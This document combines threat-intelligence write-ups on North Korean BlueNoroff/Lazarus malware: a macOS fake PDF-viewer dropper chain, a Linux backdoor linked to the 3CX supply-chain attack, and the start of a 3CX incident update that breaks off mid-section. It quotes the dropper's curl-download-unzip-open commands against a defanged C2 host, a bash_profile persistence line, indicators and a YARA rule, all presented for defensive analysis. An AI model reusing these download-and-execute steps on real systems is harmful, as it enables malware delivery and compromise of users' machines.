The stage-one malware (0be69bb9836b2a266bfd9a8b93bb412b6e4ce1be) was discovered while performing normal hunting routines for compiled AppleScript applications that contained various suspicious commands. Among our results, we identified a suspicious AppleScript file titled main.scpt contained within an unsigned application named Internal PDF Viewer.app. It should be noted that we have no reason to believe this application is allowed to execute without the user manually overriding Gatekeeper.
 
The directory structure for the stage-one dropper is shown below. As with all compiled AppleScript applications, the primary app code is within the main.scpt file, located within the /Contents/Resources/Scripts/ directory.
tree Internal\ PDF\ Viewer.app/
Internal PDF Viewer.app/
└── Contents
    ├── Info.plist
    ├── MacOS
    │   └── applet
    ├── PkgInfo
    └── Resources
        ├── Scripts
        │   └── main.scpt
        ├── applet.icns
        ├── applet.rsrc
        └── description.rtfd
            └── TXT.rtf
Although the AppleScript was compiled, we were able to extract its contents by loading it into the macOS Script Editor application. When launched, the dropper executes the code seen below:
do shell script "curl -o /users/shared/1.zip hxxps://cloud.dnx.capital/ZyCws4dD_zE/aUhUJV0p6P/S9XrRH9%2B/R51g4b5Kjj/abnY%3D -A cur1"

do shell script "unzip -o -d /users/shared /users/shared/1.zip"

do shell script "open \"/users/shared/Internal PDF Viewer.app\""
The stage-one simply executes various do shell script commands to download the stage-two from the C2 using curl. The malware writes and extracts the contents of the zip file to the /Users/Shared/ directory and executes the stage-two application also named Internal PDF Viewer.app. By breaking up the malware into several components or stages, the malware author makes analysis more difficult, especially if the C2 goes offline. This is a clever but common technique used by malware authors to thwart analysis.
At the time of our analysis, both the stage-one and stage-two components of this malware were undetected on VirusTotal.
 
 
Stage-Two
Although the stage-two (ca59874172660e6180af2815c3a42c85169aa0b2) application name and icons look very similar to stage-one, the directory structures are different and there is no use of AppleScript in the latter. The application version, size and bundle identifier — com.apple.pdfViewer — are also notably different, masquerading as a legitimate Apple bundle identifier. This application is signed with an ad-hoc signature as well.
 
The application layout is that of a much more traditional app and is written in Objective-C.
tree Internal\ PDF\ Viewer.app/
Internal PDF Viewer.app/
└── Contents
    ├── Info.plist
    ├── MacOS
    │   └── Internal PDF Viewer
    ├── PkgInfo
    ├── Resources
    │   ├── AppIcon.icns
    │   ├── Assets.car
    │   └── Base.lproj
    │       └── Main.storyboardc
    │           ├── Info.plist
    │           ├── MainMenu.nib
    │           │   ├── keyedobjects-101300.nib
    │           │   └── keyedobjects.nib
    │           ├── NSWindowController-B8D-0N-5wS.nib
    │           │   ├── keyedobjects-101300.nib
    │           │   └── keyedobjects.nib
    │           └── XfG-lQ-9wD-view-m2S-Jp-Qdl.nib
    │               ├── keyedobjects-101300.nib
    │               └── keyedobjects.nib
    └── _CodeSignature
        └── CodeResources
When the Internal PDF Viewer application is launched, the user is presented with a PDF viewing application where they can select and open PDF documents. The application, although basic, does actually operate as a functional PDF viewer. A task that isn’t overly difficult using Apple’s well-built PDFKit Framework.
 
Upon execution, the application does not perform any malicious actions yet. In order for the malware to take the next step and communicate with the attacker, the correct PDF must be loaded. We were able to track down a malicious PDF (7e69cb4f9c37fad13de85e91b5a05a816d14f490) we believe to be tied to this campaign, as it meets all the criteria in order to trigger malicious behaviors.
For example, when the malicious PDF is double-clicked from within Finder the user will see the following:
 
This minimal message informs the user that they must open the PDF using the necessary application in order to see the full details.
When opened within the malicious PDF viewer, the user will see a document (9 pages in total) that shows a venture capital firm that is interested in investing in different tech startups. From what we can tell, the PDF was created by taking the website of a small but legitimate venture capital firm and putting it into PDF format.
 
It should be noted here that earlier, the stage-one dropper reached out to cloud[.]dnx[.]capital, thus keeping on theme with the disguise of a venture capital firm.
This PDF viewer technique used by the attacker is a clever one. At this point, in order to perform analysis, not only do we need the stage-two malware but we also require the correct PDF file that operates as a key in order to execute the malicious code within the application.
So, how is the malware displaying a different PDF than the one loaded by the user?
To answer this, we take a closer look into some of the functions within the app. Most notably, we see one titled viewPDFas part of the PEPWindow class. This function seeks to a specific offset within the loaded PDF to check for a specific blob of data. If the expected data is present, a function called _encrypt_data is invoked, which, ironically runs code to decrypt the blob and produce a new PDF. It does this using a hardcoded 100-byte XOR key which can be found in the __CONSTdata of the executable.
 
This newly decrypted PDF is then displayed to the user in the application, providing the illusion that this app was truly necessary in order to view the full details of the PDF.
Since the embedded PDF file is loaded directly into the viewer, it is never written to the disk. Using a disassembler — such as Hopper — we can extract it by placing a breakpoint on the return in the encrypt_data function.
 
If analyzing the ARM executable (as opposed to the Intel executable), we can print the $x0 register which gives us all the bytes of the decrypted blob. Saving these bytes into a file will also reveal the inner PDF file.
 
Stage-Two Communication
So far we’ve decoded the PDF file that is embedded within the original PDF file, but as we stated earlier, this is the point where the malware will also phone home to the attacker. Much like the inner PDF document, the attacker’s C2 is also XOR encoded within the original PDF. This is why we see the encrypt_data function run a second time. The following bytes are passed to it which can be found towards the bottom of the original PDF document.
41 18 95 ed a5 03 3c ef d1 f1 3d ba 6a 23 3d ef 0d 22 c0 32 79 c5 a3 f8 1c b6 95 b3 99 35 93 c5 c5 6f 9c a0 df 6a 36 53 99 56 ac d2 8e c0 a7 e6 dc 16 f0 ad cf 73 14 bd 55 f5 14 b6 5a f2 af 10 e9 c2 60 c9 c0 8b 69 f1 e2 79 38 09 0a de 3e 45 6e 7d 24 73 99 30 cc 77 a1 5e
This time when the encrypt_data function runs using the same hardcoded XOR key as before, it returns the following:
 
hxxps://deck.31ventures.info/i5OvDE_RB/rUHSnl3rUu/V9Qj0zfRjl/hz2dhwQMGe/64uVA7PeqBYfe9gD/D
After the embedded PDF has been displayed to the user and the URL has been de-obfuscated, the malware then calls a function titled _downAndExecute and makes a POST request to a C2 server to presumably retrieve and execute a stage-three payload.
 
In the _downAndExecute function shown below, we can see the various parameters being set in order to initiate an HTTPrequest.
 
The malware also creates a new thread and sleeps before making the POST request again in a loop until an HTTP 200 response is returned.
Unfortunately, at the time of our analysis, the server was not responding with the necessary message.
 
We have however managed to discover a new URL on the same domain that is hosting a Mach-O executable that we believe to be the new location of the final payload.
hxxps://deck[.]31ventures[.]info/QKUh2zHgeC4/cvlw4kykmB/KANCcmwLIz/wYBfGR5XFn/_E=
If the stage-two dropper succeeds in downloading the stage-three payload, we can view the next actions within the downAndExecute_block_invoke.
 
The aforementioned image shows the following steps taking place if the C2 responds:
1.	The malware creates a temporary directory and writes the received file to that temporary directory. The name of that malicious file will be the current mach timestamp (the number of seconds since midnight January 1st, 2001). An example file path would look like this: /var/folders/g6/w3s4hg8n57sgfjl4xgrhjs_w0000gn/T/703517604263
2.	Executable permissions are assigned to the new file.
3.	The program arguments are set and the file is executed. The set argument is that of the attacker C2 decoded from this stage two payload. The stage-three will go on to use this value.
Stage-Three
The stage-three payload (182760cbe11fa0316abfb8b7b00b63f83159f5aa) is an ad-hoc signed trojan written in Rust and weighing in at a sizable 11.2MB. It’s a universal binary that holds both ARM and x86 architectures. Upon initial execution, it performs a handful of system recon commands.
One of the earliest used modules is titled webT::getinfo. Within this module is the ability to look at the basic info about the system, process listing, current time and whether or not it’s running within a VM. The functions are named accordingly.
 
Running this malware results in communication to the URL provided as the first argument passed at execution time. The WebT::send_request function is responsible for sending the initial message to the C2 server. When placing a breakpoint on it, we can step over it resulting in a call to the server.
 
This payload allows the attacker to carry out further objectives on the system, but perhaps a deep dive on stage-three is best saved for another blog post.
At a High Level
We dove fairly deeply into some of the different actions of this malware. At a higher level, the workflow looks like the following:
 
Connections to BlueNoroff
There are a few signs that this malware is tied to BlueNoroff. First and foremost is the domain used in the stage-one dropper: cloud[.]dnx[.]capital. This domain was reported as being used by the attackers in a writeup done by Proofpoint. In the previously mentioned Kaspersky blog, it was reported that the attackers had created numerous fake domains impersonating venture capital firms and banks in a campaign Kaspersky titled ‘SnatchCrypto’. This aligns with the social engineering schemes discovered in the PDF document. The Windows malware also used the “decoy document” approach which clearly worked well for the attacker. The earliest submission of the “Internal PDF Viewer” we could find on VirusTotal was uploaded in January 2023 and we’ve observed the attackers continuing to host it.
While many different PDF payloads exist that work on Windows, so far only one PDF has been discovered that will result in a call to the attacker on macOS. We do suspect more than just this one PDF exists. It’s worth noting that the XOR key found within the malware can also be found within a variety of malicious PDF files. However, when loaded into the Viewer application, these files do not result in a properly decoded URL. We suspect a different variant of the malicious viewer (or perhaps a different platform) is capable of loading the XOR key from within the PDF instead of the attackers hardcoding it in the malicious app.
Conclusion
The malware used here shows that as macOS grows in market share, attackers realize that a number of victims will be immune if their tooling is not updated to include the Apple ecosystem. Lazarus group, which has strong ties to BlueNoroff, has a long history of attacking macOS and it’s likely we’ll see more APT groups start doing the same.
Jamf Protect defends against the malicious components of this malware and blocks the malicious domains. Jamf Threat Labs will continue to monitor BlueNoroff’s activity on this campaign.
 
A shout out to Patrick Wardle for his collaboration on some of the analysis here. If you’re looking to learn more about the analysis of macOS malware, check out the free online book: The Art of Mac Malware.
Indicators of Compromise
domains:
cloud[.]dnx[.]capital - (Called from the Stage-one payload
deck[.]31ventures[.]info - (Called from the Stage-two and Stage-three payloads)

Stage-One:
dabb4372050264f389b8adcf239366860662ac52 - main.scpt
0be69bb9836b2a266bfd9a8b93bb412b6e4ce1be - Internal PDF Viewer.zip

Stage-Two:
e0e42ac374443500c236721341612865cd3d1eec - Internal PDF Viewer Universal Binary
ac08406818bbf4fe24ea04bfd72f747c89174bdb - Internal PDF Viewer x86 Binary
72167ec09d62cdfb04698c3f96a6131dceb24a9c - Internal PDF Viewer Arm Binary
fd1cef5abe3e0c275671916a1f3a566f13489416 - Internal PDF Viewer x86 Binary

ca59874172660e6180af2815c3a42c85169aa0b2 - Internal PDF Viewer.app.zip
d9f1392fb7ed010a0ecc4f819782c179efde9687 - PDF Viewer JIC Internal.zip
9121509d674091ce1f5f30e9a372b5dcf9bcd257 - Internal PDF Viewer.app.zip
a1a85cba1bc4ac9f6eafc548b1454f57b4dff7e0 - Internal PDF Viewer.app.zip
7a5d57c7e2b0c8ab7d60f7a7c7f4649f33fea8aa - Pdf Viewer.zip

Stage-Three:
182760cbe11fa0316abfb8b7b00b63f83159f5aa - Rust trojan

Malicious PDFs:
7e69cb4f9c37fad13de85e91b5a05a816d14f490 - InvestmentStrategy(Protected).pdf
be234cb6819039d6a1d3b1a205b9f74b6935bbcc - DOJ Report on Bizlato Investigation_asistant.pdf)
469236d0054a270e117a2621f70f2a494e7fb823 - DOJ Report on Bizlato Investigation.pdf
e7158bb75adf27262ec3b0f2ca73c802a6222379 - Daiwa Ventures.pdf

Malicious File Paths:
/Users/Shared/Internal PDF Viewer.app
 
Linux malware strengthens links between Lazarus and the 3CX supply-chain attack
Similarities with newly discovered Linux malware used in Operation DreamJob corroborate the theory that the infamous North Korea-aligned group is behind the 3CX supply-chain attack
 
Peter Kálnai
 
Marc-Etienne M.Léveillé
20 Apr 2023  •  15 min. read
 
ESET researchers have discovered a new Lazarus Operation DreamJob campaign targeting Linux users. Operation DreamJob is the name for a series of campaigns where the group uses social engineering techniques to compromise its targets, with fake job offers as the lure. In this case, we were able to reconstruct the full chain, from the ZIP file that delivers a fake HSBC job offer as a decoy, up until the final payload: the SimplexTea Linux backdoor distributed through an OpenDrive cloud storage account. To our knowledge, this is the first public mention of this major North Korea-aligned threat actor using Linux malware as part of this operation.
Additionally, this discovery helped us confirm with a high level of confidence that the recent 3CX supply-chain attack was in fact conducted by Lazarus – a link that was suspected from the very beginning and demonstrated by several security researchers since. In this blogpost, we corroborate these findings and provide additional evidence about the connection between Lazarus and the 3CX supply-chain attack.
The 3CX supply-chain attack
3CX is an international VoIP software developer and distributor that provides phone system services to many organizations. According to its website, 3CX has more than 600,000 customers and 12,000,000 users in various sectors including aerospace, healthcare, and hospitality. It provides client software to use its systems via a web browser, mobile app, or a desktop application. Late in March 2023, it was discovered that the desktop application for both Windows and macOS contained malicious code that enabled a group of attackers to download and run arbitrary code on all machines where the application was installed. Rapidly, it was determined that this malicious code was not something that 3CX added themselves, but that 3CX was compromised and that its software was used in a supply-chain attack driven by external threat actors to distribute additional malware to specific 3CX customers.
This cyber-incident has made headlines in recent days. Initially reported on March 29th, 2023 in a Reddit thread by a CrowdStrike engineer, followed by an official report by CrowdStrike, stating with high confidence that LABIRINTH CHOLLIMA, the company’s codename for Lazarus, was behind the attack (but omitting any evidence backing up the claim). Because of the seriousness of the incident, multiple security companies started to contribute their summaries of the events, namely Sophos, Check Point, Broadcom, Trend Micro, and more.
Further, the part of the attack affecting systems running macOS was covered in detail in a Twitter thread and a blogpost by Patrick Wardle.
Timeline of events
 
Figure 1. Timeline of events related to the preparation and distribution of 3CX trojanized applications
The timeline shows that the perpetrators had planned the attacks long before execution; as early as December 2022. This suggests they already had a foothold inside 3CX’s network late last year.
While the trojanized 3CX macOS application shows it was signed in late January, we did not see the bad application in our telemetry until February 14th, 2023. It is unclear whether the malicious update for macOS was distributed prior to that date.
Although ESET telemetry shows the existence of the macOS second-stage payload as early as February, we did not have the sample itself, nor metadata to tip us off about its maliciousness. We include this information to help defenders determine how far back systems might have been compromised.
Several days before the attack was publicly revealed, a mysterious Linux downloader was submitted to VirusTotal. It downloads a new Lazarus malicious payload for Linux and we explain its relationship to the attack later in the text.
Attribution of the 3CX supply-chain attack to Lazarus
What is already published
There is one domain that plays a significant role in our attribution reasoning: journalide[.]org. It is mentioned in some of the vendor reports linked above, but its presence is never explained. Interestingly, articles by SentinelOne and ObjectiveSee do not mention this domain. Neither does a blogpost by Volexity, which even refrained from providing attribution, stating “Volexity cannot currently map the disclosed activity to any threat actor”. Its analysts were among the first to investigate the attack in depth and they created a tool to extract a list of C&C servers from encrypted icons on GitHub. This tool is useful, as the attackers did not embed the C&C servers directly in the intermediate stages, but rather used GitHub as a dead drop resolver. The intermediate stages are downloaders for Windows and macOS that we denote as IconicLoaders, and the payloads they get as IconicStealer and UpdateAgent, respectively.
On March 30th, Joe Desimone, a security researcher from Elastic Security, was among the first to provide, in a Twitter thread, substantial clues that the 3CX-driven compromises are probably linked to Lazarus. He observed that a shellcode stub prepended to the payload from d3dcompiler_47.dll is similar to AppleJeus loader stubs attributed to Lazarus by CISA back in April 2021.
On March 31st it was being reported that 3CX had retained Mandiant to provide incident response services relating to the supply-chain attack.
On April 3rd, Kaspersky, through its telemetry, showed a direct relationship between the 3CX supply-chain victims and the deployment of a backdoor dubbed Gopuram, both involving payloads with a common name, guard64.dll. Kaspersky data shows that Gopuram is connected to Lazarus because it coexisted on victim machines alongside AppleJeus, malware that was already attributed to Lazarus. Both Gopuram and AppleJeus were observed in attacks against a cryptocurrency company.
Then, on April 11th, the CISO of 3CX summarized Mandiant’s interim findings in a blogpost. According to that report, two Windows malware samples, a shellcode loader called TAXHAUL and a complex downloader named COLDCAT, were involved in the compromise of 3CX. No hashes were provided, but Mandiant’s YARA rule, named TAXHAUL, also triggers on other samples already on VirusTotal:
•	SHA-1: 2ACC6F1D4656978F4D503929B8C804530D7E7CF6 (ualapi.dll),
•	SHA-1: DCEF83D8EE080B54DC54759C59F955E73D67AA65 (wlbsctrl.dll)
The filenames, but not MD5s, of these samples coincide with those from Kaspersky’s blogpost. However, 3CX explicitly states that COLDCAT differs from Gopuram.
The next section contains a technical description of the new Lazarus malicious Linux payload we recently analyzed, as well as how it helped us strengthen the existing link between Lazarus and the 3CX compromise.
Operation DreamJob with a Linux payload
The Lazarus group's Operation DreamJob involves approaching targets through LinkedIn and tempting them with job offers from industry leaders. The name was coined by ClearSky in a paper published in August 2020. That paper describes a Lazarus cyberespionage campaign targeting defense and aerospace companies. The activity has overlap with what we call Operation In(ter)ception, a series of cyberespionage attacks that have been ongoing since at least September 2019. It targets aerospace, military, and defense companies and uses specific malicious, initially Windows-only, tools. During July and August 2022, we found two instances of Operation In(ter)ception targeting macOS. One malware sample was submitted to VirusTotal from Brazil, and another attack targeted an ESET user in Argentina. A few weeks ago, a native Linux payload was found on VirusTotal with an HSBC-themed PDF lure. This completes Lazarus’s ability to target all major desktop operating systems.
On March 20th, a user in the country of Georgia submitted to VirusTotal a ZIP archive called HSBC job offer.pdf.zip. Given other DreamJob campaigns by Lazarus, this payload was probably distributed through spearphishing or direct messages on LinkedIn. The archive contains a single file: a native 64-bit Intel Linux binary written in Go and named HSBC job offer․pdf.
Interestingly, the file extension is not .pdf. This is because the apparent dot character in the filename is a leader dot represented by the U+2024 Unicode character. The use of the leader dot in the filename was probably an attempt to trick the file manager into treating the file as an executable instead of a PDF. This could cause the file to run when double-clicked instead of opening it with a PDF viewer. On execution, a decoy PDF is displayed to the user using xdg-open, which will open the document using the user’s preferred PDF viewer (see Figure 3). We decided to call this ELF downloader OdicLoader, as it has a similar role as the IconicLoaders on other platforms and the payload is fetched from OpenDrive.
OdicLoader drops a decoy PDF document, displays it using the system’s default PDF viewer (see Figure 2), and then downloads a second-stage backdoor from the OpenDrive cloud service. The downloaded file is stored in ~/.config/guiconfigd (SHA-1: 0CA1723AFE261CD85B05C9EF424FC50290DCE7DF). We call this second-stage backdoor SimplexTea.
As the last step of its execution, the OdicLoader modifies ~/.bash_profile, so SimplexTea is launched with Bash and its output is muted (~/.config/guiconfigd >/dev/null 2>&1).
 
Figure 2. Illustration of the probable chain of compromise
 
Figure 3. An HSBC-themed lure in the Linux DreamJob campaign
SimplexTea is a Linux backdoor written in C++. As highlighted in Table 1, its class names are very similar to function names found in a sample, with filename sysnetd, submitted to VirusTotal from Romania (SHA-1: F6760FB1F8B019AF2304EA6410001B63A1809F1D). Because of the similarities in class names and function names between SimplexTea and sysnetd, we believe SimplexTea is an updated version, rewritten from C to C++.
Table 1. Comparison of the original symbol names from two Linux backdoors submitted to VirusTotal
guiconfigd
(SimplexTea for Linux, from Georgia)	sysnetd
(BADCALL for Linux, from Romania)
CMsgCmd::Start(void)	MSG_Cmd
CMsgSecureDel::Start(void)	MSG_Del
CMsgDir::Start(void)	MSG_Dir
CMsgDown::Start(void)	MSG_Down
CMsgExit::Start(void)	MSG_Exit
CMsgReadConfig::Start(void)	MSG_ReadConfig
CMsgRun::Start(void)	MSG_Run
CMsgSetPath::Start(void)	MSG_SetPath
CMsgSleep::Start(void)	MSG_Sleep
CMsgTest::Start(void)	MSG_Test
CMsgUp::Start(void)	MSG_Up
CMsgWriteConfig::Start(void)	MSG_WriteConfig
	MSG_GetComInfo
CMsgHibernate::Start(void)	
CMsgKeepCon::Start(void)	
CMsgZipDown::Start(void)	
CMsgZip::StartZip(void *)	
CMsgZip::Start(void)	
CHttpWrapper::RecvData(uchar *&,uint *,uint,signed char)	
	RecvMsg
CHttpWrapper::SendMsg(_MSG_STRUCT *)	SendMsg
CHttpWrapper::SendData(uchar *,uint,uint)	
CHttpWrapper::SendMsg(uint,uint,uchar *,uint,uint)	
CHttpWrapper::SendLoginData(uchar *,uint,uchar *&,uint *)	
How is sysnetd related to Lazarus? The following section shows similarities with Lazarus’s Windows backdoor called BADCALL.
BADCALL for Linux
We attribute sysnetd to Lazarus because of its similarities with the following two files (and we believe that sysnetd is a Linux variant of the group’s backdoor for Windows called BADCALL):
•	P2P_DLL.dll (SHA-1: 65122E5129FC74D6B5EBAFCC3376ABAE0145BC14), which shows code similarities to sysnetd in the form of domains used as a front for fake TLS connection (see Figure 4). It was attributed to Lazarus by CISA in December 2017. From September 2019, CISA started to call newer versions of this malware BADCALL (SHA-1: D288766FA268BC2534F85FD06A5D52264E646C47).
 
Figure 4. Similarities between a Windows and a Linux variant of BADCALL (a list of domains used as a front for a fake TLS connection)
•	prtspool (SHA-1: 58B0516D28BD7218B1908FB266B8FE7582E22A5F), which shows code similarities to sysnetd (see Figure 5). It was attributed to Lazarus by CISA in February 2021. Note as well that SIMPLESEA, a macOS backdoor found during the 3CX incident response, implements the A5/1 stream cipher.
 
Figure 5. Similarities between AppleJeus for macOS and the Linux variant of BADCALL (the key for the A5/1 stream cipher)
This Linux version of the BADCALL backdoor, sysnetd, loads its configuration from a file named /tmp/vgauthsvclog. Since Lazarus operators have previously disguised their payloads, the use of this name, which is used by the VMware Guest Authentication service, suggests that the targeted system may be a Linux VMware virtual machine. Interestingly, the XOR key in this case is the same as one used in SIMPLESEA from the 3CX investigation.
 
Figure 6. Loading a configuration file by BADCALL for Linux, cf. Figure 8
Taking a look at the three 32-bit integers, 0xC2B45678, 0x90ABCDEF, and 0xFE268455 from Figure 5, which represent a key for a custom implementation of the A5/1 cipher, we realized that the same algorithm and the identical keys were used in Windows malware that dates back to the end of 2014 and was involved in one of the most notorious Lazarus cases: the cybersabotage of Sony Pictures Entertainment (SHA-1: 1C66E67A8531E3FF1C64AE57E6EDFDE7BEF2352D).
 
Figure 7. The decryption routine shared between the BADCALL for Linux and targeted destructive malware for Windows from 2014
Additional attribution data points
To recap what we’ve covered so far, we attribute the 3CX supply-chain attack to the Lazarus group with a high level of confidence. This is based on the following factors:
1.	Malware (the intrusion set):
a.	The IconicLoader (samcli.dll) uses the same type of strong encryption – AES-GCM – as SimplexTea (whose attribution to Lazarus was established via the similarity with BALLCALL for Linux); only the keys and initialization vectors differ.
b.	Based on the PE Rich Headers, both IconicLoader (samcli.dll) and IconicStealer (sechost.dll) are projects of a similar size and compiled in the same Visual Studio environment as the executables iertutil.dll (SHA-1: 5B03294B72C0CAA5FB20E7817002C600645EB475) and iertutil.dll (SHA-1: 7491BD61ED15298CE5EE5FFD01C8C82A2CDB40EC) reported in the Lazarus cryptocurrency campaigns by Volexity and Microsoft. We include below the YARA rule RichHeaders_Lazarus_NukeSped_IconicPayloads_3CX_Q12023, which flags all these samples, and no unrelated malicious or clean files, as tested on the current ESET databases and recent VirusTotal submissions.
c.	SimplexTea payload loads its configuration in a very similar way to the SIMPLESEA malware from the 3CX official incident response. The XOR key differs (0x5E vs. 0x7E), but the configuration bears the same name: apdl.cf (see Figure 8).
 
Figure 8. Loading a configuration file by SimplexTea for Linux, cf. Figure 6
2.	Infrastructure:
a.	There is shared network infrastructure with SimplexTea, as it uses https://journalide[.]org/djour.php as it C&C, whose domain is reported in the official results of the incident response of the 3CX compromise by Mandiant.
 
Figure 9. A hardcoded URL in SimplexTea for Linux
Conclusion
The 3CX compromise has gained a lot of attention from the security community since its disclosure on March 29th. This compromised software, deployed on various IT infrastructures, which allows the download and execution of any kind of payload, can have devastating impacts. Unfortunately, no software publisher is immune to being compromised and inadvertently distributing trojanized versions of their applications.
The stealthiness of a supply-chain attack makes this method of distributing malware very appealing from an attacker’s perspective. Lazarus has already used this technique in the past, targeting South Korean users of WIZVERA VeraPort software in 2020. Similarities with existing malware from the Lazarus toolset and with the group’s typical techniques strongly suggest the recent 3CX compromise is the work of Lazarus as well.
It is also interesting to note that Lazarus can produce and use malware for all major desktop operating systems: Windows, macOS, and Linux. Both Windows and macOS systems were targeted during the 3CX incident, with 3CX’s VoIP software for both operating systems being trojanized to include malicious code to fetch arbitrary payloads. In the case of 3CX, both Windows and macOS second-stage malware versions exist. This article demonstrates the existence of a Linux backdoor that probably corresponds to the SIMPLESEA macOS malware seen in the 3CX incident. We named this Linux component SimplexTea and showed that it is part of Operation DreamJob, Lazarus’s flagship campaign using job offers to lure and compromise unsuspecting victims.
For any inquiries about our research published on WeLiveSecurity, please contact us at threatintel@eset.com.
ESET Research offers private APT intelligence reports and data feeds. For any inquiries about this service, visit the ESET Threat Intelligence page.
IoCs
Files
SHA-1	Filename	ESET detection name	Description
0CA1723AFE261CD85B05C9EF424FC50290DCE7DF	guiconfigd	Linux/NukeSped.E	SimplexTea for Linux.
3A63477A078CE10E53DFB5639E35D74F93CEFA81	HSBC_job_offer․pdf	Linux/NukeSped.E	OdicLoader, a 64-bit downloader for Linux, written in Go.
9D8BADE2030C93D0A010AA57B90915EB7D99EC82	HSBC_job_offer.pdf.zip	Linux/NukeSped.E	A ZIP archive with a Linux payload, from VirusTotal.
F6760FB1F8B019AF2304EA6410001B63A1809F1D	sysnetd	Linux/NukeSped.G	BADCALL for Linux.
Network
IP address	Domain	Hosting provider	First seen	Details
23.254.211[.]230	N/A	Hostwinds LLC.	N/A	C&C server for BADCALL for Linux
38.108.185[.]79
38.108.185[.]115	od[.]lk	Cogent Communications	2023-03-16	Remote OpenDrive storage containing SimplexTea (/d/NTJfMzg4MDE1NzJf/vxmedia)
172.93.201[.]88	journalide[.]org	Nexeon Technologies, Inc.	2023-03-29	C&C server for SimplexTea (/djour.php)
MITRE ATT&CK techniques
Tactic	ID	Name	Description
Reconnaissance	T1593.001
Search Open Websites/Domains: Social Media	Lazarus attackers probably approached a target with a fake HSBC-themed job offer that would fit the target’s interest. This has been done mostly via LinkedIn in the past.
Resource Development	T1584.001
Acquire Infrastructure: Domains	Unlike many previous cases of compromised C&Cs used in Operation DreamJob, Lazarus operators registered their own domain for the Linux target.
	T1587.001
Develop Capabilities: Malware	Custom tools from the attack are very likely developed by the attackers.
	T1585.003
Establish Accounts: Cloud Accounts	The attackers hosted the final stage on the cloud service OpenDrive.
	T1608.001
Stage Capabilities: Upload Malware	The attackers hosted the final stage on the cloud service OpenDrive.
Execution	T1204.002
User Execution: Malicious File	OdicLoader masquerades as a PDF file in order to fool the target.
Initial Access	T1566.002
Phishing: Spearphishing Link	The target likely received a link to third-party remote storage with a malicious ZIP archive, which was later submitted to VirusTotal.
Persistence	T1546.004
Event Triggered Execution: Unix Shell Configuration Modification	OdicLoader modifies the victim’s Bash profile, so SimplexTea is launched each time Bash is stared and its output is muted.
Defense Evasion	T1134.002
Access Token Manipulation: Create Process with Token	SimplexTea can create a new process, if instructed by its C&C server.
	T1140
Deobfuscate/Decode Files or Information	SimplexTea stores its configuration in an encrypted apdl.cf.
	T1027.009
Obfuscated Files or Information: Embedded Payloads	The droppers of all malicious chains contain an embedded data array with an additional stage.
	T1562.003
Impair Defenses: Impair Command History Logging	OdicLoader modifies the victim’s Bash profile, so the output and error messages from SimplexTea are muted. SimplexTea executes new processes with the same technique.
	T1070.004
Indicator Removal: File Deletion	SimplexTea has the ability to delete files securely.
	T1497.003
Virtualization/Sandbox Evasion: Time Based Evasion	SimplexTea implements multiple custom sleep delays in its execution.
Discovery	T1083
File and Directory Discovery	SimplexTea can list the directory content together with their names, sizes, and timestamps (mimicking the ls -la command).
Command and Control	T1071.001
Application Layer Protocol: Web Protocols	SimplexTea can use HTTP and HTTPS for communication with its C&C server, using a statically linked Curl library.
	T1573.001
Encrypted Channel: Symmetric Cryptography	SimplexTea encrypts C&C traffic using the AES-GCM algorithm.
	T1132.001
Data Encoding: Standard Encoding	SimplexTea encodes C&C traffic using base64.
	T1090
Proxy	SimplexTea can utilize a proxy for communications.
Exfiltration	T1041
Exfiltration Over C2 Channel	SimplexTea can exfiltrate data as ZIP archives to its C&C server.
Appendix
This YARA rule flags the cluster containing both IconicLoader and IconicStealer, as well as the payloads deployed in the cryptocurrency campaigns from December 2022.
/*
The following rule will only work with YARA version >= 3.11.0
*/
import "pe"
rule RichHeaders_Lazarus_NukeSped_IconicPayloads_3CX_Q12023
{
	meta:
		description = " Rich Headers-based rule covering the IconicLoader and IconicStealer from the 3CX supply chain incident, and also payloads from the cryptocurrency campaigns from 2022-12"
		author = "ESET Research"
		date = "2023-03-31"
		hash = "3B88CDA62CDD918B62EF5AA8C5A73A46F176D18B"
		hash = "CAD1120D91B812ACAFEF7175F949DD1B09C6C21A"
		hash = "5B03294B72C0CAA5FB20E7817002C600645EB475"
		hash = "7491BD61ED15298CE5EE5FFD01C8C82A2CDB40EC"
	condition:
		pe.rich_signature.toolid(259, 30818) == 9 and
		pe.rich_signature.toolid(256, 31329) == 1 and
		pe.rich_signature.toolid(261, 30818) >= 30 and pe.rich_signature.toolid(261, 30818) <= 38 and
		pe.rich_signature.toolid(261, 29395) >= 134 and pe.rich_signature.toolid(261, 29395) <= 164 and
		pe.rich_signature.toolid(257, 29395) >= 6 and pe.rich_signature.toolid(257, 29395) <= 14
}
 
Security Update Thursday 20 April 2023 – Initial Intrusion Vector Found
 
Posted on April 20th, 2023 by Agathocles Prodromou, CNO, 3CX
Mandiant identifies the source of internal network compromise
While Mandiant’s investigation is still ongoing, we now have a clear overall understanding of the attack. Following our previous update, we would like to share some additional technical details to support our customers and the community. We have also published additional indicators of compromise that organizations can leverage for their network defenses.
Initial Intrusion Vector
Mandiant identified the source of our internal network compromise began in 2022 when an employee installed the Trading Technologies X_TRADER software on the employee’s personal computer. Although the X_TRADER installation software was downloaded from the Trading Technologies website, it contained VEILEDSIGNAL malware, which enabled the threat actor (identified as UNC4736) to initially compromise and maintain persistence on the employee’s personal computer.
The X_TRADER installer (X_TRADER_r7.17.90p608.exe) was digitally signed by a valid code signing certificate with the subject of “Trading Technologies International, Inc”. It was hosted on hxxps://download.tradingtechnologies[.]com. While the X_TRADER software was reportedly retired in 2020 by Trading Technologies, the software was still available for download on the Trading Technologies website in 2022. The code signing certificate used to digitally sign the malicious software was set to expire in October 2022.
For more technical detail on the X_TRADER software supply chain attack, including YARA Rules for hunting, please read Mandiant’s blog at https://www.mandiant.com/resources/blog/3cx-software-supply-chain-compromise.
Lateral Movement
Following the initial compromise of the employee’s personal computer using VEILEDSIGNAL malware, Mandiant assesses the threat actor stole the employee's 3CX corporate credentials from his system. VEILEDSIGNAL is a fully-featured malware that provided the threat actor with administrator-level access and persistence to the compromised system. The earliest evidence of compromise uncovered within the 3CX corporate environment occurred through the VPN using the employee's corporate credentials two days after the employee's personal computer was compromised.
Additionally, Mandiant identified the use of the Fast Reverse Proxy tool (https://github.com/fatedier/frp) which the threat actor used to move laterally within the 3CX environment. The tool was named MsMpEng.exe and located in the C:\Windows\System32 directory.
CI/CD Build Environment Compromise
